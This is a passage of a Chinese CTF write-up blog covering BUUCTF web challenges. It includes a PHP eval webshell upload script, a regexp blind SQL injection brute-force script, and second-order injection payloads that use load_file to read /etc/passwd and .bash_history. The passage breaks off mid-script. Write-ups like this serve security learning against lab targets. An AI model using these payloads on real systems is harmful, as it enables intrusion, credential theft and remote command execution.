class="headerlink" title="过程与脚本"></a>过程与脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://93678a40-98db-4f30-ac85-4d6f0820e597.node4.buuoj.cn:81/\</span></span><br><span class="line"><span class="string">flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">file_data = &#123;<span class="string">&quot;file&quot;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">res = requests.post(url=url,files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>运行后访问dir.php得到文件名，然后POST &#x2F;flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpAJEMpx包含文件执行命令cmd&#x3D;phpinfo();flag就在里面。</p><p>PS：我试的时候，get和直接写入phpinfo都可以，但是写post就不行。不明所以。</p><p>而且get的时候flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpAJEMpx&amp;cmd&#x3D;echo%20system(‘whoami’);没有回显</p><p>&#x2F;flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpAJEMpx&amp;cmd&#x3D;echo%201;有回显。说明ban了一些东西。</p><p>可以用蚁剑连上去，然后用插件disable_function绕过就行了。（见之前文章）</p><h4 id="法二-利用-session-upload-progress-进行-session-文件包含"><a href="#法二-利用-session-upload-progress-进行-session-文件包含" class="headerlink" title="法二 利用 session.upload_progress 进行 session 文件包含"></a>法二 利用 session.upload_progress 进行 session 文件包含</h4><p>（坑）这个牵扯出东西有点多，先挖个坑</p><p><a href="https://syunaht.com/p/2193317358.html">https://syunaht.com/p/2193317358.html</a></p><p><a href="https://www.cnblogs.com/R3col/p/14929237.html">https://www.cnblogs.com/R3col/p/14929237.html</a></p><p><a href="https://fanygit.github.io/2021/10/18/[NPUCTF2020]ezinclude%201/">https://fanygit.github.io/2021/10/18/[NPUCTF2020]ezinclude%201/</a></p><p><a href="https://www.shawroot.cc/%e7%95%99%e8%a8%80%e6%9d%bf">https://www.shawroot.cc/%e7%95%99%e8%a8%80%e6%9d%bf</a></p><p><a href="http://www.snowywar.top/">http://www.snowywar.top/</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/114656092">https://blog.csdn.net/rfrder/article/details/114656092</a></p><p><a href="https://www.cnblogs.com/Article-kelp/p/14826360.html">https://www.cnblogs.com/Article-kelp/p/14826360.html</a></p><p><a href="https://blog.csdn.net/weixin_45646006/article/details/120817553">https://blog.csdn.net/weixin_45646006/article/details/120817553</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> 坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[NCTF2019]SQLi</title>
      <link href="/2023/02/14/NCTF2019-SQLi/"/>
      <url>/2023/02/14/NCTF2019-SQLi/</url>
      
        <content type="html"><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="regexp-正则注入"><a href="#regexp-正则注入" class="headerlink" title="regexp 正则注入"></a>regexp 正则注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">select database() regexp &quot;^d&quot;; 输出是否数据库名开头是d</span><br><span class="line">^d是正则表达式，也可以用其他的如</span><br><span class="line">regexp &#x27;^[a-z]&#x27;  #判断一个表的第一个字符串是否在a-z中</span><br><span class="line">regexp &#x27;^r&#x27;      #判断第一个字符串是否为r</span><br><span class="line">regexp &#x27;^r[a-z]&#x27; #判断一个表的第二个字符串是否在a-z中</span><br><span class="line">regexp &#x27;y$&#x27;      #判断最后一个字符串是否为y</span><br><span class="line"></span><br><span class="line">（不过regexp不区分大小写）（坑）</span><br><span class="line">用or password regexp binary &#123;&#125;</span><br><span class="line">或者</span><br><span class="line">or (select binary username from users limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+</span><br><span class="line">https://blog.csdn.net/qq_43625917/article/details/105189912</span><br><span class="line">https://blog.csdn.net/qq_36761831/article/details/82862135</span><br></pre></td></tr></table></figure><h4 id="like注入"><a href="#like注入" class="headerlink" title="like注入"></a>like注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ps:这个是顺带学的</span><br><span class="line">百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线_通配符允许匹配任何单个字符。</span><br><span class="line">1.like &#x27;s%&#x27;判断第一个字符是否为s</span><br><span class="line">union select 1,database() like &#x27;s%&#x27;,3 --+</span><br><span class="line">2.like &#x27;se%&#x27;判断前面两个字符串是否为se</span><br><span class="line">union select 1,database() like &#x27;se%&#x27;,3 --+</span><br><span class="line">3.like &#x27;%sq%&#x27; 判断是否包含se两个字符串</span><br><span class="line">union select 1,database() like &#x27;%se%&#x27;,3 --+</span><br><span class="line">4.like &#x27;_____&#x27;判断是否为5个字符</span><br><span class="line">union select 1,database() like &#x27;_____&#x27;,3 --+</span><br><span class="line">5.like &#x27;s____&#x27; 判断第一个字符是否为s</span><br><span class="line">union select 1,database() like &#x27;s____&#x27;,3 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h4><p>过滤了like，in,&#x3D;</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开是一个登录页面，还有弹窗和甩脸上的SQL语句。</p><p>​select * from users where username&#x3D;’’ and passwd&#x3D;’’</p><p>尝试登录无果，试一下寻找信息。发现有robots.txt</p><p>robots.txt有hint.txt</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$black_list <span class="operator">=</span> &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[<span class="string">&#x27;passwd&#x27;</span>] <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> admin<span class="string">&#x27;s password,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then you will get the flag;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">没有过滤\，则可以username中输入\，这样语句就变成了</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">由于一个单引号被转义，那么就username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;然后剩下一个单引号</span></span><br><span class="line"><span class="string">所以我们passwd可以输入我们要的语句||passwd regexp &quot;^a&quot;;%00</span></span><br><span class="line"><span class="string">即用00截断（题目PHP版本5.2.16），再补上分号符合格式</span></span><br><span class="line"><span class="string">这样整一条语句就变成</span></span><br><span class="line"><span class="string">select * from users where username=&#x27;</span>\<span class="string">&#x27; and passwd=&#x27;</span><span class="operator">||</span>passwd regexp &quot;^a&quot;;<span class="operator">%</span><span class="number">00</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">接下来只需要一直换正则内容就行，空格用/**/绕过，过滤常用注释符-&gt;00截断</span></span><br></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>先burp跑一下，查看正确的，方便写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># buuctf web [NCTF2019]SQLi</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="comment"># 字典</span></span><br><span class="line">passwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">string = string.ascii_lowercase + string.digits + <span class="string">&#x27;_&#x27;</span>  <span class="comment"># +string.ascii_letters</span></span><br><span class="line"><span class="comment"># 小写字母，数字，全部字母</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造字典</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dict_list = [ i for i in range(97,123)]</span></span><br><span class="line"><span class="comment"># shuzi = [i for i in range(48,58)]</span></span><br><span class="line"><span class="comment"># dict_list +=shuzi</span></span><br><span class="line"><span class="comment"># dict_list.append(95)</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://dadcd953-c830-4ce9-b813-b10e1544ac89.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;</span>.<span class="built_in">format</span>((passwd + m), parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">            <span class="comment">#  parse.unquote(&#x27;%00&#x27;)和quote ()相反，将转义符替换为原本的字符，比如会把&quot; %3A &quot;转义为&quot;: &quot;。</span></span><br><span class="line">            <span class="comment">#  &#x27;passwd&#x27;: &#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;.format((pw + i))</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            passwd += m</span><br><span class="line">            <span class="built_in">print</span>(passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> m == <span class="string">&#x27;_&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(passwd)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="得到"><a href="#得到" class="headerlink" title="得到"></a>得到</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you_will_never_know7788990</span><br></pre></td></tr></table></figure><p>填入密码然后登录就可以得到flag</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>regexp注入，还有其他like注入，多掌握几种。闭合方式也不是只有单引号，也可以转义。SQL没有系统学过，还是有很多未掌握的知识</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://fanygit.github.io/2021/08/27/[NCTF2019]SQLi%201/">https://fanygit.github.io/2021/08/27/[NCTF2019]SQLi%201/</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/106029042">https://blog.csdn.net/weixin_43610673/article/details/106029042</a></p><p><a href="https://blog.csdn.net/l2872253606/article/details/125265138">https://blog.csdn.net/l2872253606/article/details/125265138</a></p><p><a href="https://blog.csdn.net/SopRomeo/article/details/108983645">https://blog.csdn.net/SopRomeo/article/details/108983645</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> sql </tag>
            
            <tag> 坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2018]Comment</title>
      <link href="/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/"/>
      <url>/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>进入是有个发帖按钮。尝试发帖，跳转到登录。提示账号密码。那么猜密码，或者爆破，直接猜zhangwei666，正确。</p><p>提交留言，发现有的提交之后可以直接在comment.php查看，有的提交后则不显示。发现：在category中加入’’,”这些符号，则会留言不成功，推测应该是这样会导致语句执行出错而不成功。所以可以尝试’,”，看看是什么闭合方式。发现只有一个双引号会成功，那应该是单引号闭合了（因为单引号闭合，如果输入单引号则会有三个单引号，引发错误）</p><p>而在comment.php?id&#x3D;1这里可能有注入，但是尝试注入也没有发现什么，异或也不行。所以还是尝试在登录注册这里来。</p><p>可以使用脚本先进行测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f0aafbd4-e538-4c85-8f03-f97935710ee7.node4.buuoj.cn:81/&quot;</span></span><br><span class="line"></span><br><span class="line">write = url + <span class="string">&quot;write_do.php?do=write&quot;</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;0uafn4oeh6ohgta0ebtqtshu12&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">now_id = <span class="number">9</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;category&quot;</span>: payload,</span><br><span class="line">    <span class="string">&quot;content&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(write, data=data1, cookies=cookie)</span><br><span class="line"></span><br><span class="line">comment = url + <span class="string">&quot;write_do.php?do=comment&quot;</span></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;content&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bo_id&quot;</span>: now_id + <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(comment, data=data2, cookies=cookie)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">soup = BeautifulSoup(res.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(soup.select(<span class="string">&#x27;.col-sm-5&#x27;</span>))</span><br><span class="line">con = re.findall(<span class="string">&#x27;&lt;div class=&quot;col-sm-5&quot;&gt;&lt;p&gt;(.*?)&lt;/p&gt;&lt;/div&gt;&#x27;</span>, res.text, re.S | re.M)</span><br><span class="line"><span class="built_in">print</span>(con)</span><br><span class="line"><span class="built_in">print</span>(con[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(now_id)</span><br></pre></td></tr></table></figure><p>但是没什么成果。继续查找其他信息。</p><p>发现可以xss，三个地方都可以写xss。但还是没什么用。</p><p>发现：控制台有： <code>程序员GIT写一半跑路了,都没来得及Commit :)</code>，那么用githacker来恢复一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://f0aafbd4-e538-4c85-8f03-f97935710ee7.node4.buuoj.cn:81/.git --output-folder ./buucomment</span><br><span class="line">然后进入buucomment里面的文件夹里面</span><br><span class="line">git log --reflog查看历史版本</span><br><span class="line">有三个版本</span><br><span class="line">git reset --hard 版本号 可以选择任何一个版本，可以一一查看，然后看下面的文件。结果是最新的那个版本的PHP文件正确。</span><br></pre></td></tr></table></figure><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="审计源码"><a href="#审计源码" class="headerlink" title="审计源码"></a>审计源码</h3><p>在write的时候，会将写的内容都进行addslashes,而在comment（评论）的时候则会取出category，这里就存在二次注入了。注入点在category处，而且最后呈现出来的是content处，所以我们两处进行一起处理。仔细看代码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;insert into comment</span><br><span class="line">            set category = &#x27;$category&#x27;,</span><br><span class="line">                content = &#x27;$content&#x27;,</span><br><span class="line">                bo_id = &#x27;$bo_id&#x27;&quot;;</span><br><span class="line">这里是得需要多行注释<span class="comment">/**/</span></span><br><span class="line">所以我们需要输入</span><br><span class="line"><span class="number">1</span>、category<span class="operator">=</span><span class="string">&#x27;,content=sql,/*  </span></span><br><span class="line"><span class="string">2、content=*/# 井号为了注释后面的逗号</span></span><br><span class="line"><span class="string">即形成</span></span><br><span class="line"><span class="string">$sql = &quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;&#x27;,content=sql语句,/*&#x27;</span>,</span><br><span class="line">                content <span class="operator">=</span> <span class="string">&#x27;*/#&#x27;</span>,</span><br><span class="line">                bo_id <span class="operator">=</span> <span class="string">&#x27;$bo_id&#x27;</span>&quot;;</span><br><span class="line">sql语句可以是database(),user(),或者(select database())</span><br></pre></td></tr></table></figure><h3 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">由<span class="keyword">user</span>()得出是root<span class="variable">@localhost</span>，一般 flag 就不会在数据库里面(因为如果在数据库中，不需要root权限)所以得用<span class="keyword">SQL</span>注入读取本地文件。而且尝试读表，但是被过滤掉了information表，还有sys表由于版本问题无法使用</span><br><span class="line">version()————<span class="number">5.5</span><span class="number">.64</span><span class="operator">-</span>MariaDB<span class="number">-1</span>ubuntu0<span class="number">.14</span><span class="number">.04</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">payload1 <span class="operator">=</span> &quot;&#x27;,content=database(),/*&quot;  # ctf</span><br><span class="line">payload1 <span class="operator">=</span> &quot;&#x27;,content=user(),/*&quot;  # root<span class="variable">@localhost</span></span><br><span class="line">payload1 <span class="operator">=</span> &quot;&#x27;,content=load_file(&#x27;/etc/passwd&#x27;),/*&quot;</span><br><span class="line"></span><br><span class="line">读取用户的命令行历史</span><br><span class="line">payload1 <span class="operator">=</span> &quot;&#x27;,content=(select (load_file(&#x27;/home/www/.bash_history&#x27;))),/*&quot;</span><br><span class="line">cd <span class="operator">/</span>tmp<span class="operator">/</span> unzip html.zip rm <span class="operator">-</span>f html.zip cp <span class="operator">-</span>r html <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span> cd <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span> rm <span class="operator">-</span>f .DS_Store service apache2 <span class="keyword">start</span></span><br><span class="line"></span><br><span class="line">读取在tmp目录下的文件</span><br><span class="line">payload1 <span class="operator">=</span> &quot;&#x27;,content=(select (load_file(&#x27;/tmp/html/.DS_Store&#x27;))),/*&quot;</span><br><span class="line">Bud1 strapIl bootstrapIlocblobF(</span><br><span class="line"></span><br><span class="line">由于太多了所以转为hex来读取</span><br><span class="line">payload1 <span class="operator">=</span> &quot;&#x27;,content=(select hex(load_file(&#x27;/tmp/html/.DS_Store&#x27;))),/*&quot;</span><br><span class="line"></span><br><span class="line">发现有flag文件，则读取</span><br><span class="line">payload1 <span class="operator">=</span> &quot;&#x27;,content=(select hex(load_file(&#x27;/tmp/html/flag_8946e1ff1ee3e40f.php&#x27;))),/*&quot;</span><br><span class="line">发现是假的，则读取</span><br><span class="line">payload1 <span class="operator">=</span> &quot;&#x27;,content=(select hex(load_file(&#x27;/var/www/html/flag_8946e1ff1ee3e40f.php&#x27;))),/*&quot;</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 